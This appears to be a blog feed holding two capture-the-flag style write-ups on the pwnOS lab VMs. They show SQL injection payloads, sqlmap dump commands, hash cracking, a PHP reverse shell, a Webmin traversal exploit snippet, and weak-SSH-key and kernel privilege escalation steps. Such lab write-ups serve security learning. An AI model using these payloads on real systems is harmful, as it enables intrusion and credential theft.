    <content type="html"><![CDATA[<p>pwn0sv2 is version two in the pwn0s series (?), and can be found <a href="http://boot2root.info/">here</a> at our good friend g0tmi1k&rsquo;s pentest page.  I previously did a write up on the first version of pwn0s and enjoyed it, so I was excited to see there was another version available.  Forewarning: obvious spoilers.</p>

<p>The zip comes packaged with a README with your standard disclaimer/info affair, along with the static IP.  10.10.10.100 is the set IP address.  I set my BT5 onto the 10.10.10.1/24 subnet and did a quick scan of the box:</p>

<p>There&rsquo;s that pesky OpenSSH Debian build; we could try hunting for weak keys, but that looks to be a newer version of OpenSSH and likely not to be susceptible to that vulnerability.  Nonetheless, it may be worth keeping in mind as we move forward.  <a href="http://www.debian.org/security/2008/dsa-1571">Here&rsquo;s</a> a link to the old advisory for the curious.</p>

<p>There also appears to be an HTTP website up.  Browsing around that gives us a couple of forms; /login.php and /register.php.  With so few services open, I&rsquo;m given the impression that this is going to be a web vulnerability.  First thing I do in almost every registration field:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_sqli.jpg"></p>

<p>And low and behold, we&rsquo;re vulnerable to SQLi.  And away we go.</p>

<p><img class="center" src="/images/posts/2012/pwnos2_sqli2.jpg"></p>

<p>After playing around with the UNION SELECT&rsquo;s, it finally settled on 8 columns and 4 being the displayed one.  So <code>' UNION SELECT 1,2,3,user(), 4,5,6,7,8;-- -</code></p>

<p>If you try that, you&rsquo;ll notice you can&rsquo;t actually stick the entire thing into the login box.  Busting Burp open will fix that:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_sqli3.jpg"></p>

<p>Which gives us:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_sqli4.jpg"></p>

<p>Fantastic!  This means that the mysql daemon is running as root user.  That makes our SQLi attacks much more dangerous; UDF is now available to us.  Lets explore the system a bit more.</p>

<p>```
&lsquo; UNION SELECT 1,2,3,version(),5,6,7,8&mdash; &ndash;</p>

<pre><code>  Welcome 5.1.54-1ubuntu4
</code></pre>

<p>&lsquo; UNION SELECT 1,2,3,database(),5,6,7,8&mdash; &ndash;</p>

<pre><code>  Welcome ch16
</code></pre>

<p>&lsquo; UNION SELECT 1,2,3,load_file(/etc/passwd),5,6,7,8&mdash; &ndash;</p>

<pre><code>  An error occured(...)
</code></pre>

<p>```</p>

<p>Looks like they&rsquo;re at the very least escaping slashes.  No problem:</p>

```</p></blockquote>

<p>Hm, looks like we can&rsquo;t hit /etc/shadow.  Weird.  Lets move on to rapidly enumerating the back end.  I switched over to sqlmap to give more info on the backend.  We already know the vulnerable form, we know the POST format (from our Burp session), and we know the database (from UNION queries above) so lets plug that in for some interesting stuff.</p>

<p>```</p>

<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=True&rsquo; -p &lsquo;email&rsquo; &mdash;tables -D &lsquo;ch16&rsquo;
Database: ch16
Table: users
```</p></blockquote>

<p>One table.  Let&rsquo;s check it out:</p>

<p>```</p>

<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;columns -T &lsquo;users&rsquo; &mdash;dump  <br/>
```</p></blockquote>

<p>This gave me a single user, &lsquo;Dan&rsquo;, with a user level 0 and his hash: <code>c2c4b4e51d9e23c02c15702c136c3e950ba9a4af</code></p>

<p>I let sqlmap run its own cracker against the hash, then dumped it into oclHashCat:<br/>
<code>cudaHashCat-plus64 -m 300 -a 3 -n 50 --gpu-watchdog=100 --force hash.txt ?l?l?l?l?l?l?l?l</code></p>

<p>I then dumped database users to see what was there, and what the hashes were (assumed sha1(sha1(pass)), but you never know)</p>

<p>```</p>

<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;users

<p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;passwords</p>

</code></pre>

<p>```</p></blockquote>

<p>Pretty much what I expected.  At this point I figured the next best thing to try, with my root privileges and all, is UDF injection.  If you&rsquo;re unfamiliar with UDF&rsquo;s, here&rsquo;s a very brief breakdown: a user defined function is a way to extend the functionality of a database by providing a function that&rsquo;s able to be evaluated by the backend database server.  In our case, we want something akin to an eval() or exec().  This can be done with the lib_mysqludf_sys library.  If you want more information on UDF injection, read <a href="https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf">this</a> fantastic paper from BlackHat 2009 by Damele.</p>

<p>Our attack method is then this: upload the precompiled library into the MySQL plugin directory, create our custom function, and execute some good stuff (passwd, addusr, whatever).  I first needed to know where the plugin directory was.  A quick <a href="https://dev.mysql.com/doc/refman/5.0/en/server-system-variables.html">google</a> of MySQL system variables gives us an answer:</p>

<p><code>
' UNION SELECT 1,2,3,@@plugin_dir,5,6,7,8-- -
Welcome /usr/lib/mysql/plugin
</code></p>

<p>Now we just need to write our library there and create the functions:</p>

<p><code>
python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE' -p 'email' --file-write=/lib_mysqludf_sys --file-dest=/usr/lib/mysql/plugin/
CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
SELECT * FROM information_schema.routines
</code></p>

<p>The final SELECT there does not return our newly created function.  According to MySQL documentation, we need INSERT privileges.  Do we have them?</p>

<p>```
[*] &lsquo;root&rsquo;@&lsquo;localhost&rsquo; (administrator) [27]:</p>

<pre><code>            privilege: ALTER
            privilege: ALTER ROUTINE
            privilege: CREATE
            privilege: CREATE ROUTINE
            privilege: CREATE TEMPORARY TABLES
            privilege: CREATE USER
            privilege: CREATE VIEW
            privilege: DELETE
            privilege: DROP
            privilege: EVENT
            privilege: EXECUTE
            privilege: FILE
            privilege: INDEX
            privilege: INSERT
            privilege: LOCK TABLES
            privilege: PROCESS
            privilege: REFERENCES
            privilege: RELOAD
            privilege: REPLICATION CLIENT
            privilege: REPLICATION SLAVE
            privilege: SELECT
            privilege: SHOW DATABASES
            privilege: SHOW VIEW
            privilege: SHUTDOWN
            privilege: SUPER
            privilege: TRIGGER
            privilege: UPDATE
</code></pre>

<p>```</p>

<p>It appears we do.  In fact, it doesn&rsquo;t seem we have write access to anything; we can&rsquo;t even INSERT into any tables.  We&rsquo;ll come back to why this doesn&rsquo;t work in a bit.  For now, I threw a reverse PHP shell on the box for more control.  I used pentestmonkey&rsquo;s great php-reverse-shell, and soon enough had a prompt:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_shell.jpg"></p>

<p>I&rsquo;m going to cut out a lot of my trial/error in finding some of this stuff, but note that there is a blog in /var/www.  This provides Simple PHP Blog, which just so happens to be <a href="http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=Simple+PHP+Blog&amp;filter_exploit_text=&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=">vulnerable</a> to LFI; so there&rsquo;s another attack vector for the reverse PHP shell.  Also note the mysqld is listening on 127.0.0.1, which rules out that complex exploit David Kennedy <a href="http://www.exploit-db.com/exploits/19092/">wrote</a>.  Not to mention we&rsquo;re not in a real term.</p>

<p>Note that there are no privilege escalation vulnerabilities for that kernel or for that Ubuntu distribution.  MySQL does not appear to be UDF-injectable, and even though it&rsquo;s telling us we&rsquo;re root@localhost, we simply don&rsquo;t have it.  It is also worth nothing that an attempt to drop a shell script in /etc/cron.d/ and adding a cron entry got AppArmor a bit upset.</p>

<p>My next step was to see if there were any vulnerable binaries uploaded.</p>

<p><code>
find $1 -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- &gt; /tmp/dump.txt
</code></p>

<p>This dumped modified files by date, so newest at the top, oldest at the bottom.  After getting through all the modified /proc&rsquo;s, I noticed this monster: fakeroot.  Essentially this emulates a root environment but only allows certain file manipulations.  It can be used to run daemons in an environment that&rsquo;s root-like, but not.  This had to be why my MySQL UDF attempts were not working.  Moving on down the list, I noticed another file: /var/mysqli_connect.php.  Weird, what&rsquo;s a PHP file doing in var?</p>

<p>```</p>

<blockquote><p>cat /var/mysqli_connect.php
[&hellip;]
// Set the database access information as constants:
  DEFINE (&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
  DEFINE (&lsquo;DB_PASSWORD&rsquo;, &lsquo;root@ISIntS&rsquo;);
  DEFINE (&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
  DEFINE (&lsquo;DB_NAME&rsquo;, &lsquo;ch16&rsquo;);
[&hellip;]
```</p></blockquote>

<p>Oh.  That&rsquo;s&hellip;it?  Really?  Knowing that root was permitted to ssh in, I quickly gave it a shot:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_root.jpg"></p>

<p>Yup.  That was it.  I suppose the idea here is that incompetent developers can hard code root passwords into arbitrary PHP files laying around the system, but it just seems like more of a scavenger hunt in the end.  I was really hoping there was some obscure vulnerability in a binary, or some fun MySQL UDF injection I could&rsquo;ve done.</p>

<p>All in all, fun, but once you&rsquo;ve got a shell its an exercise in frustration.  Can&rsquo;t say I didn&rsquo;t learn anything though.</p>

<p>Note:  If you&rsquo;re running BackTrack5 and need certain VirtualBox features (bidirectional clipboard, shared folders, etc.), you&rsquo;ll need to prepare kernel headers first.  Follow <a href="http://www.backtrack-linux.org/wiki/index.php/Preparing_Kernel_Headers">these</a> instructions before installing Guest Additions.  If you&rsquo;ve got it installed, just reinstall them.  You&rsquo;ll know it&rsquo;s successful if you don&rsquo;t get &lsquo;could not find kernel headers&rsquo; errors.</p>

    <id>http://hatRiot.github.io/blog/2012/06/07/solving-pwn0s</id>
    <content type="html"><![CDATA[<p>pwnOS is a vulnerable VM used in penetration testing and vulnerability assessment.  I thought this one was pretty fun, so I&rsquo;ve decided to do a little write up in the various ways it can be attacked.  The VM for it can be found on forums.hackingdojo.com; you need an account to access the forums, but it&rsquo;s worth it.</p>

<p>The VM comes packaged as a split vmdk, so just loading up the vmx sets everything up.  Booting it up and flipping over to BackTrack, a quick nmap scan gives us a few immediate vectors of attack:</p>

<p><img src="/images/posts/2012/scan.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>So there&rsquo;s a few notable things here; the OpenSSH version, specifically that Debian build, is known to generate weak, predictable SSH keys.  This vulnerability is due to a side-effect of removing a bit of code that effected the initial seeding for the PRNG; instead of seeding it with true, random data, it instead only used a process ID. There are a total of 32,768 process ID&rsquo;s available, meaning, only 32,768 potential seeds to the PRNG.  We can attack this by generating a 2048 bit key (that&rsquo;s the bit size of the RSA key, according to nmap) 32,768 times with the number as a seed.  We&rsquo;ll set this aside, for now, and come back to it.</p>

<p>There&rsquo;s an HTTP server up with some plaintext HTML on it, but nothing worthy of any web-side exploits.  That version of Apache has some DoS vulnerabilities, but that doesn&rsquo;t do much for us.</p>

<p>The next interesting port is actually on 10000; MiniServ is a fairly obscure, hyperminimal web server written in C.  It&rsquo;s barely supported and has a very low exposure level.  On the frontend runs WebMin, a PHP interface for HTTP servers.  As it happens to turn out, there&rsquo;s a vulnerability allowing an attacker to retrieve unauthorized remote files.  This will work harmoniously with our OpenSSH vulnerability above!  I pulled some perl code from <a href="http://www.exploit-db.com/exploits/2017/">here</a> and dumped a few things:</p>

<p><img src="/images/posts/2012/webmin.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>Oh boy users!  Lets back up for a minute and take a look at this exploit.  If we pop open the perl code, we see a little bit of this:</p>

<p>```
 $temp=&ldquo;/..%01&rdquo; x 40;</p>

<pre><code>    if ($tar == '0')
       { my $url= "http://". $target. ":" . $port ."/unauthenticated/".$temp . $filename;
        $content=get $url;

        print("\n FILE CONTENT STARTED");
        print("\n -----------------------------------\n");

        print("$content");
        print("\n -------------------------------------\n");
        }
</code></pre>

<p>```</p>

<p>That&rsquo;s about as easy as it gets when it comes to exploits; we&rsquo;re filling up the url with /..%01.  It does this 40 times until the buffer is full, then appends the filename onto the end.    I dug into the Webmin source code to see exactly what was going on; diffing 1.28 and 1.29, I found this:</p>

<p><img src="/images/posts/2012/diff.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>Essentially it was checking for a directory traversal in the path, but only checking &ldquo;..&rdquo;.  In our exploit, we&rsquo;re appending a %01, which is the ASCII Start of Header.  This final, encoded ASCII code can be any control code; that&rsquo;s %00 &ndash; %1F (<a href="http://www.w3schools.com/tags/ref_urlencode.asp">codes</a>).  This works because these codes have no purpose in the URL and do not decode to anything useful; they merely throw off the $b eq &ldquo;..&rdquo; check by doing nothing.  The remainder of the code is left as an exercise for the reader.</p>

<p>Now that we&rsquo;ve got a few names, we can run through RSA keys and see if we get a match.  HD Moore of Metasploit has already generated and distributed the keys, and can be retrieved <a href="http://metasploit.com/users/hdm/tools/debian-openssl/">here</a>.  Got &lsquo;em?  Cool; now we can test keys against the usernames in the file.  I used <a href="http://www.exploit-db.com/exploits/5632/">this</a> to iterate through them, but it shouldn&rsquo;t be too hard to code it up yourself.  Essentially we just want to connect to the server with one of the usernames with the generated keys; when we pop a shell, we know we&rsquo;re in:</p>

<p><img src="/images/posts/2012/brute.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>So now we&rsquo;ve got ourselves a private RSA key for account &lsquo;obama&rsquo;.  Testing it out, and&hellip;</p>

<p><img src="/images/posts/2012/ssh.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>Success!  So now we&rsquo;ve got a valid account on the box.  We see it&rsquo;s an x86 Ubuntu machine on the 2.6.22 kernel.  What can we do?  Well, immediately I recognize a major vulnerability in the kernel version.  A bit of googling will turn up the vmsplice exploit.  The exploit itself is in fact a chaining of three separate, now patched, vulnerabilities in the fs/splice.c module.  I will let the fantastic article at <a href="https://lwn.net/Articles/268783/">lwn</a> describe the vulnerability in more detail, and instead put it to some use here:</p>

<p><img src="/images/posts/2012/vmsplice_root.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>And just like that we&rsquo;ve got root on the box.</p>

<p>Other avenues of attack could be sticking Medusa/Hydra on the SSH port and letting it brute force the accounts, exploiting remote uploads to MiniServ, or the local ftruncate root exploit.  Though fairly easy and straightforward (I didn&rsquo;t have to write a line of code), this VM was fun to toy around with.</p>
